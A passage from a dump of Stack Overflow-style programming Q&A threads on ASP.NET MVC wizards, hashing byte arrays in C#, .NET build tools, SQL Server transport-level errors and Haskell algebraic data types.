<p><a href=""http://weblogs.asp.net/mhawley/archive/tags/MVC/default.aspx"" rel=""nofollow"">http://weblogs.asp.net/mhawley/archive/tags/MVC/default.aspx</a><br />
<a href=""http://devlicio.us/blogs/tim_barcz/archive/2008/08/22/prg-pattern-in-the-asp-net-mvc-framework.aspx"" rel=""nofollow"">http://devlicio.us/blogs/tim_barcz/archive/2008/08/22/prg-pattern-in-the-asp-net-mvc-framework.aspx</a></p>

<p>Use that along with a robust domain model (for tracking steps or form completion state or whatever you call it) and you're golden.</p>
 <pre><code>public class CreateAccountWizardController : Controller
{
   public ActionRresult Step1()
   {
   }


   public ActionResult Step2()
   {
   }
}
</code></pre>
 <p>In order to keep the steps you could implement a page flow action filters, which provide an experience like this one:</p>

<pre><code>[RequiredStep(FlowStart = true)]
public ActionResult Confirm()
{
    return View();
}

[RequiredStep (PreviousStep = ""Confirm"")]
public ActionResult ExecuteOrder()
{
    return RedirectToAction(""ThankYou"");
}

[RequiredStep(PreviousStep = ""ExecuteOrder"")]
public ActionResult ThankYou()
{
    return View();
}
</code></pre>
 <p>I left the page flow up to the view, where I believe it belongs, so different views could have different page flows (e.g. for desktop browser clients or mobile phone clients etc.) I wrote it up on my blog: <a href=""http://shouldersofgiants.co.uk/Blog/post/2009/09/16/A-RESTful-Wizard-Using-ASPNet-MVCe280a6-Perhaps.aspx"" rel=""nofollow"">A RESTful Wizard Using ASP.Net MVC… Perhaps?</a></p>
"
"How do I generate a hashcode from a byte array in C#? <p>Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).</p>

<p>Here's what I have today:</p>

<pre><code>struct SomeData : IEquatable&lt;SomeData&gt;
{
    private readonly byte[] data;
    public SomeData(byte[] data)
    {
        if (null == data || data.Length &lt;= 0)
        {
            throw new ArgumentException(""data"");
        }
        this.data = new byte[data.Length];
        Array.Copy(data, this.data, data.Length);
    }

    public override bool Equals(object obj)
    {
        return obj is SomeData &amp;&amp; Equals((SomeData)obj);
    }

    public bool Equals(SomeData other)
    {
        if (other.data.Length != data.Length)
        {
            return false;
        }
        for (int i = 0; i &lt; data.Length; ++i)
        {
            if (data[i] != other.data[i])
            {
                return false;
            }
        }
        return true;
    }
    public override int GetHashCode()
    {
        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);
    }
}
</code></pre>

<p>Any thoughts?</p>

<hr>

<p>dp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).
for example:</p>

<pre><code>byte[] b1 = new byte[] { 1 };
byte[] b2 = new byte[] { 1 };
int h1 = b1.GetHashCode();
int h2 = b2.GetHashCode();
</code></pre>

<p>With that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.</p>
 <p>If you are looking for performance, I tested a few hash keys, and 
I recommend <a href=""http://burtleburtle.net/bob/hash/doobs.html"" rel=""nofollow"">Bob Jenkin's hash function</a>. It is both crazy fast
to compute and will give as few collisions as the cryptographic
hash you used until now.</p>

<p>I don't know C# at all, and I don't know if it can link with C, but
here is <a href=""http://burtleburtle.net/bob/c/lookup3.c"" rel=""nofollow"">its implementation in C</a>.</p>
 <p>The hash code of an object shouldn't be unique. </p>

<p>The checking rule is: </p>

<ul>
<li>Are the hash codes equal? Then call the full (slow) <code>Equals</code> method.</li>
<li>Are the hash codes not equal? Then the two items are definitely not equal.</li>
</ul>

<p>All you want is a <code>GetHashCode</code> algorithm that splits up your collection into roughly even groups - it shouldn't form the key as the <code>HashTable</code> or <code>Dictionary&lt;&gt;</code> will need to use the hash to optimise retrieval.</p>

<p>How long do you expect the data to be? How random? If lengths vary greatly (say for files) then just return the length.  If lengths are likely to be similar look at a subset of the bytes that varies.</p>

<p><code>GetHashCode</code> should be a lot quicker than <code>Equals</code>, but doesn't need to be unique.</p>

<p>Two identical things <em>must never</em> have different hash codes. Two different objects <em>should not</em> have the same hash code, but some collisions are to be expected (after all, there are more permutations than possible 32 bit integers).</p>
 <p>Is using the existing hashcode from the byte array field not good enough? Also note that in the Equals method you should check that the arrays are the same size before doing the compare.</p>
 <p>Generating a good hash is easier said than done.  Remember, you're basically representing n bytes of data with m bits of information.  The larger your data set and the smaller m is, the more likely you'll get a collision ... two pieces of data resolving to the same hash.</p>

<p>The simplest hash I ever learned was simply XORing all the bytes together.  It's easy, faster than most complicated hash algorithms and a halfway decent general-purpose hash algorithm for small data sets.  It's the Bubble Sort of hash algorithms really.  Since the simple implementation would leave you with 8 bits, that's only 256 hashes ... not so hot.  You could XOR chunks instead of individal bytes, but then the algorithm gets much more complicated.</p>

<p>So certainly, the cryptographic algorithms are maybe doing some stuff you don't need ... but they're also a huge step up in general-purpose hash quality.  The MD5 hash you're using has 128 bits, with billions and billions of possible hashes.  The only way you're likely to get something better is to take some representative samples of the data you expect to be going through your application and try various algorithms on it to see how many collisions you get.</p>

<p>So until I see some reason to not use a canned hash algorithm (performance, perhaps?), I'm going to have to recommend you stick with what you've got.</p>
 <p>Have you compared with the <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.sha1cryptoserviceprovider.computehash.aspx"" rel=""nofollow"">SHA1CryptoServiceProvider.ComputeHash</a> method? It takes a byte array and returns a SHA1 hash, and I believe it's pretty well optimized. I used it in an <a href=""http://www.codeplex.com/Identicon/SourceControl/FileView.aspx?itemId=63541&amp;changeSetId=3301"" rel=""nofollow"">Identicon Handler</a> that performed pretty well under load.</p>
 <p><a href=""http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.runtimehelpers.gethashcode.aspx"" rel=""nofollow"">RuntimeHelpers.GetHashCode</a> might help:</p>

<blockquote>
  <p>From Msdn:</p>
  
  <p>Serves as a hash function for a
  particular type, suitable for use in
  hashing algorithms and data structures
  such as a hash table.</p>
</blockquote>
 <p>Whether you want a perfect hashfunction (different value for each object that evaluates to equal) or just a pretty good one is always a performance tradeoff, it takes normally time to compute a good hashfunction and if your dataset is smallish you're better of with a fast function. The most important (as your second post points out) is correctness, and to achieve that all you need is to return the Length of the array. Depending on your dataset that might even be ok. If it isn't (say all your arrays are equally long) you can go with something cheap like looking at the first and last value and XORing their values and then add more complexity as you see fit for your data. </p>

<p>A quick way to see how your hashfunction performs on your data is to add all the data to a hashtable and count the number of times the Equals function gets called, if it is too often you have more work to do on the function. If you do this just keep in mind that the hashtable's size needs to be set bigger than your dataset when you start, otherwise you are going to rehash the data which will trigger reinserts and more Equals evaluations (though possibly more realistic?)</p>

<p>For some objects (not this one) a quick HashCode can be generated by ToString().GetHashCode(), certainly not optimal, but useful as people tend to return something close to the identity of the object from ToString() and that is exactly what GetHashcode is looking for</p>

<p>Trivia: The worst performance I have ever seen was when someone by mistake returned a constant from GetHashCode, easy to spot with a debugger though, especially if you do lots of lookups in your hashtable</p>
 <p>Borrowing from the code generated by JetBrains software, I have settled on this function:</p>

<pre><code>    public override int GetHashCode()
    {
        unchecked
        {
            var result = 0;
            foreach (byte b in _key)
                result = (result*31) ^ b;
            return result;
        }
    }
</code></pre>

<p>The problem with just XOring the bytes is that 3/4 (3 bytes) of the returned value has only 2 possible values (all on or all off).  This spreads the bits around a little more.</p>

<p>Setting a breakpoint in Equals was a good suggestion.  Adding about 200,000 entries of my data to a Dictionary, sees about 10 Equals calls (or 1/20,000).</p>
 <p>Don't use cryptographic hashes for a hashtable, that's ridiculous/overkill.</p>

<p>Here ya go... Modified FNV Hash in C#</p>

<p><a href=""http://bretm.home.comcast.net/hash/6.html"">http://bretm.home.comcast.net/hash/6.html</a></p>

<pre><code>	public static int ComputeHash(params byte[] data)
	{
		unchecked
		{
			const int p = 16777619;
			int hash = (int)2166136261;

			for (int i = 0; i &lt; data.Length; i++)
				hash = (hash ^ data[i]) * p;

			hash += hash &lt;&lt; 13;
			hash ^= hash &gt;&gt; 7;
			hash += hash &lt;&lt; 3;
			hash ^= hash &gt;&gt; 17;
			hash += hash &lt;&lt; 5;
			return hash;
		}
	}
</code></pre>
 <p>Following post contains code snippet to generate MD5 hash code using C#:</p>

<p><a href=""http://www.etechplanet.com/post/2009/03/29/Generate-MD5-Hash-code-from-a-string-using-C.aspx"" rel=""nofollow"">http://www.etechplanet.com/post/2009/03/29/Generate-MD5-Hash-code-from-a-string-using-C.aspx</a></p>
 <p>I would recommend <strong>Bob Jenkins Hash</strong>, which is explained with code <a href=""http://bretm.home.comcast.net/~bretm/hash/7.html"" rel=""nofollow"">here</a>. It's far better distributed than the <strong>Fowler/Noll/Vo (FNV) Hash</strong> mentioned in another answer.</p>
 <p>I found interesting results:</p>

<p>I have the class:</p>

<pre><code>public class MyHash : IEquatable&lt;MyHash&gt;
{        
    public byte[] Val { get; private set; }

    public MyHash(byte[] val)
    {
        Val = val;
    }

    /// &lt;summary&gt;
    /// Test if this Class is equal to another class
    /// &lt;/summary&gt;
    /// &lt;param name=""other""&gt;&lt;/param&gt;
    /// &lt;returns&gt;&lt;/returns&gt;
    public bool Equals(MyHash other)
    {
        if (other.Val.Length == this.Val.Length)
        {
            for (var i = 0; i &lt; this.Val.Length; i++)
            {
                if (other.Val[i] != this.Val[i])
                {
                    return false;
                }
            }

            return true;
        }
        else
        {
            return false;
        }            
    }

    public override int GetHashCode()
    {            
        var str = Convert.ToBase64String(Val);
        return str.GetHashCode();          
    }
}
</code></pre>

<p>Then I created a dictionary with keys of type MyHash in order to test how fast I can insert and I can also know how many collisions there are. I did the following</p>

<pre><code>        // dictionary we use to check for collisions
        Dictionary&lt;MyHash, bool&gt; checkForDuplicatesDic = new Dictionary&lt;MyHash, bool&gt;();

        // used to generate random arrays
        Random rand = new Random();



        var now = DateTime.Now;

        for (var j = 0; j &lt; 100; j++)
        {
            for (var i = 0; i &lt; 5000; i++)
            {
                // create new array and populate it with random bytes
                byte[] randBytes = new byte[byte.MaxValue];
                rand.NextBytes(randBytes);

                MyHash h = new MyHash(randBytes);

                if (checkForDuplicatesDic.ContainsKey(h))
                {
                    Console.WriteLine(""Duplicate"");
                }
                else
                {
                    checkForDuplicatesDic[h] = true;
                }
            }
            Console.WriteLine(j);
            checkForDuplicatesDic.Clear(); // clear dictionary every 5000 iterations
        }

        var elapsed = DateTime.Now - now;

        Console.Read();
</code></pre>

<p>Every time I insert a new item to the dictionary the dictionary will calculate the hash of that object. So you can tell what method is most efficient by placing several answers found in here in the method <code>public override int GetHashCode()</code> The method that was by far the fastest and had the least number of collisions was:</p>

<pre><code>    public override int GetHashCode()
    {            
        var str = Convert.ToBase64String(Val);
        return str.GetHashCode();          
    }
</code></pre>

<p>that took 2 seconds to execute. The method</p>

<pre><code>    public override int GetHashCode()
    {
        // 7.1 seconds
        unchecked
        {
            const int p = 16777619;
            int hash = (int)2166136261;

            for (int i = 0; i &lt; Val.Length; i++)
                hash = (hash ^ Val[i]) * p;

            hash += hash &lt;&lt; 13;
            hash ^= hash &gt;&gt; 7;
            hash += hash &lt;&lt; 3;
            hash ^= hash &gt;&gt; 17;
            hash += hash &lt;&lt; 5;
            return hash;
        }
    }
</code></pre>

<p><strong>had no collisions also but it took 7 seconds to execute!</strong></p>
 <pre><code>private int? hashCode;

public override int GetHashCode()
{
    if (!hashCode.HasValue)
    {
        var hash = 0;
        for (var i = 0; i &lt; bytes.Length; i++)
        {
            hash = (hash &lt;&lt; 4) + bytes[i];
        }
        hashCode = hash;
    }
    return hashCode.Value;
}
</code></pre>
"
"Best .NET build tool <blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/476163"">NAnt or MSBuild, which one to choose and when?</a>  </p>
</blockquote>



<p>What is the best build tool for <a href=""http://en.wikipedia.org/wiki/.NET_Framework"">.NET</a>?</p>

<p>I currently use <a href=""http://en.wikipedia.org/wiki/NAnt"">NAnt</a> but only because I have experience with <a href=""http://en.wikipedia.org/wiki/Apache_Ant"">Ant</a>. Is <a href=""http://en.wikipedia.org/wiki/MSBuild"">MSBuild</a> preferred?</p>
 <p>Generally speaking, I get the impression that NAnt offers more flexibility compared to MSBuild, whereas (with my relatively simple needs) I've been fine with the latter so far.</p>
 <p>We use MSBuild, because we started with Visual&nbsp;Studio&nbsp;2005 (now Visual&nbsp;Studio&nbsp;2008), and MSBuild was already ""built in"" to the SDK - there is less maintenance on the build server. It's a NAnt clone, really - both tools are infinitely flexible in that they let you create custom build tasks in code, and both have a decent set of community build tasks already created.</p>

<ul>
<li><a href=""http://msbuildtasks.tigris.org"" rel=""nofollow"">MSBuild Community Tasks</a></li>
<li><a href=""http://nantcontrib.sourceforge.net/"" rel=""nofollow"">NAntContrib</a></li>
</ul>
 <p>We actually use a combination of <a href=""http://en.wikipedia.org/wiki/NAnt"">NAnt</a> and <a href=""http://en.wikipedia.org/wiki/MSBuild"">MSBuild</a> with <a href=""http://en.wikipedia.org/wiki/CruiseControl"">CruiseControl</a>. NAnt is used for script flow control and calls MSBuild to compile projects. After the physical build is triggered, NAnt is used to publish the individual project build outputs to a shared location.</p>

<p>I am not sure this is <i>the best</i> process. I think many of us are still looking for a great build tool. One promising thing I heard recently on .NET Rocks, <a href=""http://www.dotnetrocks.com/default.aspx?showNum=362"">episode 362</a>, is <a href=""http://codebetter.com/blogs/james.kovacs/archive/2008/06/27/introducing-psake.aspx"">James Kovac's PSake</a>, a build system he based entirely on PowerShell. It sounds really promising since what you can do with PowerShell is fairly limitless in theory.</p>
 <p>I've used both and prefer <a href=""http://en.wikipedia.org/wiki/NAnt"" rel=""nofollow"">NAnt</a>. It's really hard for me to say one is ""better"" than the other.</p>
 <p>I have used both MSBuild and NAnt, and I much prefer MSBuild, mainly because it requires a lot less configuration by default. Although you can over-complicate things and load MSBuild down with a lot of configuration junk too, at its simplest, you can just point it at a solution/project file and have it go which, most of the time, for most cases, is enough.</p>
 <p>It also depends on <strong>what</strong> you're building. The <a href=""http://www.codeplex.com/sdctasks"" rel=""nofollow"">MSBuild SDC Task library</a> has a couple of special tasks. For example, for <a href=""http://en.wikipedia.org/wiki/Active_Directory"" rel=""nofollow"">AD</a>, <a href=""https://en.wikipedia.org/wiki/Microsoft_BizTalk_Server"" rel=""nofollow"">BizTalk</a>, etc.</p>

<blockquote>
  <p>There are over 300 tasks included in
  this library including tasks for:
  creating websites, creating
  application pools, creating
  ActiveDirectory users, running <a href=""http://en.wikipedia.org/wiki/FxCop"" rel=""nofollow"">FxCop</a>,
  configuring virtual servers, creating
  zip files, configuring <a href=""https://en.wikipedia.org/wiki/Component_Object_Model#COM.2B_and_DCOM"" rel=""nofollow"">COM+</a>, creating
  folder shares, installing into the
  <a href=""http://en.wikipedia.org/wiki/Global_Assembly_Cache"" rel=""nofollow"">GAC</a>, configuring <a href=""http://en.wikipedia.org/wiki/Microsoft_SQL_Server"" rel=""nofollow"">SQL Server</a>,
  configuring BizTalk 2004 and BizTalk
  2006, etc.</p>
</blockquote>
 <p>I'd just like to throw <a href=""https://en.wikipedia.org/wiki/FinalBuilder"" rel=""nofollow"">FinalBuilder</a> in to the mix. It's not free, but if you're fed up with editing <a href=""http://en.wikipedia.org/wiki/XML"" rel=""nofollow"">XML</a> files and want a somewhat nicer (<a href=""http://en.wiktionary.org/wiki/IMO"" rel=""nofollow"">IMO</a>) environment to work in I would give it a go.</p>

<p>I've worked with all of them and have always went back to FinalBuilder.</p>
 <p>I use MSBuild completely for building.  Here's my generic MSBuild script that searches the tree for .csproj files and builds them:</p>

<pre><code>&lt;Project xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"" DefaultTargets=""Build""&gt;
  &lt;UsingTask AssemblyFile=""$(MSBuildProjectDirectory)\bin\xUnit\xunitext.runner.msbuild.dll"" TaskName=""XunitExt.Runner.MSBuild.xunit""/&gt;
  &lt;PropertyGroup&gt;
	&lt;Configuration Condition=""'$(Configuration)'==''""&gt;Debug&lt;/Configuration&gt;
    &lt;DeployDir&gt;$(MSBuildProjectDirectory)\Build\$(Configuration)&lt;/DeployDir&gt;
	&lt;ProjectMask&gt;$(MSBuildProjectDirectory)\**\*.csproj&lt;/ProjectMask&gt;
	&lt;ProjectExcludeMask&gt;&lt;/ProjectExcludeMask&gt;
    &lt;TestAssembliesIncludeMask&gt;$(DeployDir)\*.Test.dll&lt;/TestAssembliesIncludeMask&gt;
  &lt;/PropertyGroup&gt;

  &lt;ItemGroup&gt;
    &lt;ProjectFiles Include=""$(ProjectMask)"" Exclude=""$(ProjectExcludeMask)""/&gt;
  &lt;/ItemGroup&gt;

  &lt;Target Name=""Build"" DependsOnTargets=""__Compile;__Deploy;__Test""/&gt;

  &lt;Target Name=""Clean""&gt;
    &lt;MSBuild Projects=""@(ProjectFiles)"" Targets=""Clean""/&gt;
    &lt;RemoveDir Directories=""$(DeployDir)""/&gt;
  &lt;/Target&gt;

  &lt;Target Name=""Rebuild"" DependsOnTargets=""Clean;Build""/&gt;

  &lt;!--
  ===== Targets that are meant for use only by MSBuild =====
  --&gt;
  &lt;Target Name=""__Compile""&gt;
    &lt;MSBuild Projects=""@(ProjectFiles)"" Targets=""Build""&gt;
      &lt;Output TaskParameter=""TargetOutputs"" ItemName=""AssembliesBuilt""/&gt;
    &lt;/MSBuild&gt;
    &lt;CreateItem Include=""@(AssembliesBuilt -&gt; '%(RootDir)%(Directory)*')""&gt;
      &lt;Output TaskParameter=""Include"" ItemName=""DeployFiles""/&gt;
    &lt;/CreateItem&gt;
  &lt;/Target&gt;

  &lt;Target Name=""__Deploy""&gt;
    &lt;MakeDir Directories=""$(DeployDir)""/&gt;
    &lt;Copy SourceFiles=""@(DeployFiles)"" DestinationFolder=""$(DeployDir)""/&gt;
    &lt;CreateItem Include=""$(TestAssembliesIncludeMask)""&gt;
      &lt;Output TaskParameter=""Include"" ItemName=""TestAssemblies""/&gt;
    &lt;/CreateItem&gt;
  &lt;/Target&gt;

  &lt;Target Name=""__Test""&gt;
    &lt;xunit Assembly=""@(TestAssemblies)""/&gt;
  &lt;/Target&gt;
&lt;/Project&gt;
</code></pre>

<p>(Sorry if it's a little dense.  Markdown seems to be stripping out the blank lines.)</p>

<p>It's pretty simple though once you understand the concepts and all the dependencies are handled automatically.  I should note that we use Visual Studio project files, which have a lot of logic built into them, but this system allows people to build almost identically both within the Visual Studio IDE or at the command line and still gives you the flexibility of adding things to the canonical build like the xUnit testing you see in the script above.</p>

<p>The one PropertyGroup is where all the configuration happens and things can be customized, like excluding certain projects from the build or adding new test assembly masks.</p>

<p>The ItemGroup is where the logic happens that finds all the .csproj files in the tree.</p>

<p>Then there are the targets, which most people familiar with make, nAnt or MSBuild should be able to follow.  If you call the Build target, it calls <em>_Compile, _</em>Deploy and __Test.  The Clean target calls MSBuild on all the project files for them to clean up their directories and then the global deployment directory is deleted.  Rebuild calls Clean and then Build.</p>
 <p>Using a dynamic scripting language like Python, BOO, Ruby, etc. to create and maintain build scripts might be a good alternative to an XML based one like NAnt. (They tend to be cleaner to read than XML.)</p>
 <p>I use a commercial software, <a href=""http://www.automatedqa.com/products/abs"" rel=""nofollow"">Automated Build Studio</a> for the build purpose. </p>
 <p>UppercuT uses NAnt to build and it is the insanely easy to use Build Framework.</p>

<p>Automated Builds as easy as (1) solution name, (2) source control path, (3) company name for most projects!</p>

<p><a href=""http://projectuppercut.org"" rel=""nofollow"">http://projectuppercut.org/</a></p>

<p>Some good explanations here: <a href=""http://ferventcoder.com/category/10094.aspx"" rel=""nofollow"">UppercuT</a></p>
 <p>There is another new build tool (a very intelligent wrapper) called <strong>NUBuild</strong>. It's lightweight, open source and extremely easy to setup and provides almost no-touch maintenance. I really like this new tool, and we have made it a standard tool for our continuous build and integration of our projects (we have about 400 projects across 75 developers). Try it out.</p>

<p><a href=""http://nubuild.codeplex.com/"" rel=""nofollow"" title=""NUBuild"">http://nubuild.codeplex.com/</a></p>

<ul>
<li>Easy to use command line interface</li>
<li>Ability to target all <a href=""http://en.wikipedia.org/wiki/.NET_Framework"" rel=""nofollow"">.NET</a> Framework
versions, that is, 1.1, 2.0, 3.0 and 3.5</li>
<li>Supports XML based configuration</li>
<li>Supports both project and file
references</li>
<li>Automatically generates the “complete
ordered build list” for a given
project – No touch maintenance.</li>
<li>Ability to detect and display
circular dependencies</li>
<li>Perform parallel build -
automatically decides which of the
projects in the generated build list
can be built independently.</li>
<li>Ability to handle proxy assemblies</li>
<li>Provides a visual clue to the build
process, for example, showing “% completed”,
“current status”, etc.</li>
<li>Generates detailed execution log both
in XML and text format</li>
<li>Easily integrated with
<a href=""http://en.wikipedia.org/wiki/CruiseControl"" rel=""nofollow"">CruiseControl.NET</a> continuous
integration system</li>
<li>Can use custom logger like XMLLogger
when targeting 2.0 + version</li>
<li>Ability to parse error logs</li>
<li>Ability to deploy built assemblies to
user specified location</li>
<li>Ability to synchronize source code
with source-control system</li>
<li>Version management capability</li>
</ul>
 <p>We're using <a href=""https://github.com/refractalize/bounce"" rel=""nofollow"">Bounce</a>, a framework for cleaner build scripts in C#.</p>
 <p><a href=""http://en.wikipedia.org/wiki/Rake_%28software%29"" rel=""nofollow"">Rake</a> and Albacore is an excellent combination. The power of Ruby and no XML.</p>

<p><a href=""http://tekpub.com/blogs/tekpub-free-bin/7964799-net-open-source-5-net-automation-with-rake-and-albacore-by-liam-mclennan"" rel=""nofollow"">.NET Open Source 5 - .NET Automation with Rake and Albacore by Liam McLennan</a> [Tekpub.com]</p>
"
"How do you deal with transport-level errors in SqlConnection? <p>Every now and then in a high volume .NET application, you might see this exception when you try to execute a query:</p>

<blockquote>
  <p>System.Data.SqlClient.SqlException:  A transport-level error has
  occurred when sending the request to the server.</p>
</blockquote>

<p>According to my research, this is something that ""just happens"" and not much can be done to prevent it.  It does not happen as a result of a bad query, and generally cannot be duplicated.  It just crops up maybe once every few days in a busy OLTP system when the TCP connection to the database goes bad for some reason.</p>

<p>I am forced to detect this error by parsing the exception message, and then retrying the entire operation from scratch, to include using a new connection.  None of that is pretty.</p>

<p>Anybody have any alternate solutions?</p>
 <p>You should also check hardware connectivity to the database.</p>

<p>Perhaps this thread will be helpful:
<a href=""http://channel9.msdn.com/forums/TechOff/234271-Conenction-forcibly-closed-SQL-2005/"" rel=""nofollow""><a href=""http://channel9.msdn.com/forums/TechOff/234271-Conenction-forcibly-closed-SQL-2005/"" rel=""nofollow"">http://channel9.msdn.com/forums/TechOff/234271-Conenction-forcibly-closed-SQL-2005/</a></a></p>
 <p>I'm using reliability layer around my DB commands (abstracted away in the repository interfaece). Basically that's just code that intercepts any expected exception (DbException and also InvalidOperationException, that happens to get thrown on connectivity issues), logs it, captures statistics and retries everything again.</p>

<p>With that reliability layer present, the service has been able to survive stress-testing gracefully (constant dead-locks, network failures etc). Production is far less hostile than that.</p>

<p>PS: <a href=""http://rabdullin.com/how-to-create-configurable-reliability-layer-with-photonnet/"" rel=""nofollow"">There is more on that here</a> (along with a simple way to define reliability with the interception DSL)</p>
 <p>To answer your original question:</p>

<p>A more elegant way to detect this particular error, without parsing the error message, is to inspect the <code>Number</code> property of the <code>SqlException</code>.</p>

<p>(This actually returns the error number from the first <code>SqlError</code> in the <code>Errors</code> collection, but in your case the transport error should be the only one in the collection.)</p>
 <p>I had the same problem. I asked my network geek friends, and all said what people have replied here: Its the connection between the computer and the database server. In my case it was my Internet Service Provider, or there router that was the problem. After a Router update, the problem went away. But do you have any other drop-outs of internet connection from you're computer or server? I had...</p>
 <p>I posted <a href=""http://stackoverflow.com/questions/154897/what-do-you-do-if-you-cannot-resolve-a-bug#155077"">an answer on another question</a> on another topic that might have some use here.  That answer involved SMB connections, not SQL.  However it was identical in that it involved a low-level transport error.</p>

<p>What we found was that in a heavy load situation, it was fairly easy for the remote server to time out connections <em>at the TCP layer</em> simply because the server was busy.  Part of the reason was the defaults for how many times TCP will retransmit data on Windows weren't appropriate for our situation.</p>

<p>Take a look at the <a href=""http://support.microsoft.com/kb/314053"">registry settings for tuning TCP/IP</a> on Windows.  In particular you want to look at <strong>TcpMaxDataRetransmissions</strong> and maybe <strong>TcpMaxConnectRetransmissions</strong>.  These default to 5 and 2 respectively, try upping them a little bit on the client system and duplicate the load situation.</p>

<p>Don't go crazy!  TCP doubles the timeout with each successive retransmission, so the timeout behavior for bad connections can go exponential on you if you increase these too much.  As I recall upping <strong>TcpMaxDataRetransmissions</strong> to 6 or 7 solved our problem in the vast majority of cases.</p>
 <p>I have seen this happen in my own environment a number of times.  The client application in this case is installed on many machines.  Some of those machines happen to be laptops people were leaving the application open disconnecting it and then plugging it back in and attempting to use it.  This will then cause the error you have mentioned.</p>

<p>My first point would be to look at the network and ensure that servers aren't on DHCP and renewing IP Addresses causing this error.  If that isn't the case then you have to start trawlling through your event logs looking for other network related.</p>

<p>Unfortunately it is as stated above a network error.  The main thing you can do is just monitor the connections using a tool like netmon and work back from there.</p>

<p>Good Luck.</p>
 <p>This <a href=""http://blogs.msdn.com/spike/archive/2009/04/16/a-transport-level-error-has-occurred-when-sending-the-request-to-the-server-provider-tcp-provider-error-0-an-existing-connection-was-forcibly-closed-by-the-remote-host.aspx"" rel=""nofollow"">blog post</a> by <a href=""http://blogs.msdn.com/spike/default.aspx"" rel=""nofollow"">Michael Aspengren</a> explains the error message ""A transport-level error has occurred when sending the request to the server.""</p>
 <p>I had the same problem albeit it was with service requests to a SQL DB.</p>

<p>This is what I had in my service error log:</p>

<hr>

<p>System.Data.SqlClient.SqlException: A transport-level error has occurred when sending the request to the server. (provider: TCP Provider, error: 0 - An existing connection was forcibly closed by the remote host.)</p>

<hr>

<p>I have a C# test suite that tests a service. The service and DB were both on external servers so I thought that might be the issue. So I deployed the service and DB locally to no avail. The issue continued. The test suite isn't even a hard pressing performance test at all, so I had no idea what was happening. The same test was failing each time, but when I disabled that test, another one would fail continuously. </p>

<p>I tried other methods suggested on the Internet that didn't work either:</p>

<ul>
<li>Increase the registry values of <strong>TcpMaxDataRetransmissions</strong> and <strong>TcpMaxConnectRetransmissions</strong>.</li>
<li>Disable the ""Shared Memory"" option within SQL Server Configuration Manager under ""Client Protocols"" and sort TCP/IP to 1st in the list.</li>
<li>This might occur when you are testing scalability with a large number of client connection attempts. To resolve this issue, use the regedit.exe utility to add a new DWORD value named SynAttackProtect to the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\ with value data of 00000000.</li>
</ul>

<p>My last resort was to use the old age saying ""Try and try again"". So I have nested try-catch statements to ensure that if the TCP/IP connection is lost in the lower communications protocol that it does't just give up there but tries again. This is now working for me, however it's not a very elegant solution.</p>
 <p>use Enterprise Services with transactional components</p>
 <p>As far as I can tell, class 20 is transport level.</p>
 <p>I experienced the transport error this morning in SSMS while connected to SQL 2008 R2 Express.</p>

<p>I was trying to import a CSV with \r\n.  I coded my row terminator for 0x0d0x0a.  When I changed it to 0x0a, the error stopped.  I can change it back and forth and watch it happen/not happen.</p>

<pre><code> BULK INSERT #t1 FROM 'C:\123\Import123.csv' WITH 
      ( FIRSTROW = 1, FIELDTERMINATOR = ',', ROWTERMINATOR = '0x0d0x0a' )
</code></pre>

<p>I suspect I am not writing my row terminator correctly because SQL parses one character at a time right while I'm trying to pass two characters.</p>

<p>Anyhow, this error is 4 years old now, but it may provide a bit of information for the next user.</p>
 <p>I just wanted to post a fix here that worked for our company on new software we've installed. We were getting the following error since day 1 on the client log file: Server was unable to process request. ---> A transport-level error has occurred when receiving results from the server. (provider: TCP Provider, error: 0 - The semaphore timeout period has expired.) ---> The semaphore timeout period has expired.</p>

<p>What completely fixed the problem was to set up a link aggregate (LAG) on our switch. Our Dell FX1 server has redundant fiber lines coming out of the back of it. We did not realize that the switch they're plugged into needed to have a LAG configured on those two ports. See details here: <a href=""https://docs.meraki.com/display/MS/Switch+Ports#SwitchPorts-LinkAggregation"" rel=""nofollow"">https://docs.meraki.com/display/MS/Switch+Ports#SwitchPorts-LinkAggregation</a></p>
"
"Haskell's algebraic data types <p>I'm trying to fully understand all of Haskell's concepts.</p>

<p>In what ways are algebraic data types similar to generic types, e.g., in C# and Java? And how are they different? What's so algebraic about them anyway? </p>

<p>I'm familiar with universal algebra and its rings and fields, but I only have a vague idea of how Haskell's types work.</p>
 <p>""Algebraic Data Types"" in Haskell support <em>full parametric polymorphism</em>, which is the more technically correct name for generics, as a simple example the list data type:</p>

<pre><code> data List a = Cons a (List a) | Nil
</code></pre>

<p>Is equivalent (as much as is possible, and ignoring non-strict evaluation, etc) to</p>

<pre><code> class List&lt;a&gt; {
     class Cons : List&lt;a&gt; {
         a head;
         List&lt;a&gt; tail;
     }
     class Nil : List&lt;a&gt; {}
 }
</code></pre>

<p>Of course Haskell's type system allows more ... interesting use of type parameters but this is just a simple example.  With regards to the ""Algebraic Type"" name, i've honestly never been entirely sure of the exact reason for them being named that, but have assumed that it's due the mathematical underpinnings of the type system.  I <em>believe</em> that the reason boils down to the theoretical definition of an ADT being the ""product of a set of constructors"", however it's been a couple of years since i escaped university so i can no longer remember the specifics.</p>

<p>[Edit: Thanks to Chris Conway for pointing out my foolish error, ADT are of course sum types, the constructors providing the product/tuple of fields]</p>
 <p>For me, the concept of Haskell's algebraic data types always looked like polymorphism in OO-languages like C#.</p>

<p>Look at the example from <a href=""http://en.wikipedia.org/wiki/Algebraic_data_types"" rel=""nofollow""><a href=""http://en.wikipedia.org/wiki/Algebraic_data_types"" rel=""nofollow"">http://en.wikipedia.org/wiki/Algebraic_data_types</a></a>:</p>

<pre><code>data Tree = Empty 
          | Leaf Int 
          | Node Tree Tree
</code></pre>

